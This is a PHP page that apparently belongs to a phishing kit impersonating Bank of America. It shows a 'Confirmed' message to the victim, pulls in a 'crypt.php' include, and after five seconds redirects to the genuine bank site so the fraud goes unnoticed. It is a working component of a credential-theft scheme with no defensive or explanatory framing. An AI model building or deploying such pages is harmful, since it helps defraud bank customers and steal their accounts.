<?php
if (isset($_GET['SESSIONID'])) {
$session="Confirmed.php?True=1&zone=1&SESSIONID=".$_GET['SESSIONID'];
$header="https://www.bankofamerica.com"; 
?>
<!DOCTYPE html>
<html>
<?php require_once 'crypt.php'; ?>
<head>
<title>Confimed !</title>
<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<link rel="shortcut icon" href="imgs/favicon.ico" type="image/ico" />
<META HTTP-EQUIV="Refresh" CONTENT="5;URL=<?php echo $header; ?>">
<link rel="stylesheet" type="text/css" href="imgs/login.css?css_session=<?php echo $session; ?>" media="all" />
<style>

#con1 {
	position:absolute;
	left:50%;
	top:50%;
	margin:-75px 0 0 -135px;
}

#con {
	position:absolute;
	left:35%;
	top:132%;
	margin:-75px 0 0 -135px;
}
</style>
</head>

<body>
	<div id="processing"> </div>
	<div id="con1">
	<img src = "imgs/confirmed.png"  height ="200" weidth="200" alt="Confimed !">
	<br>

	<div id="con">
	<img src = "imgs/co.png"  height ="40" weidth="40" alt="">
	</div>
</body>

</html> 
<?php ob_end_flush(); }?>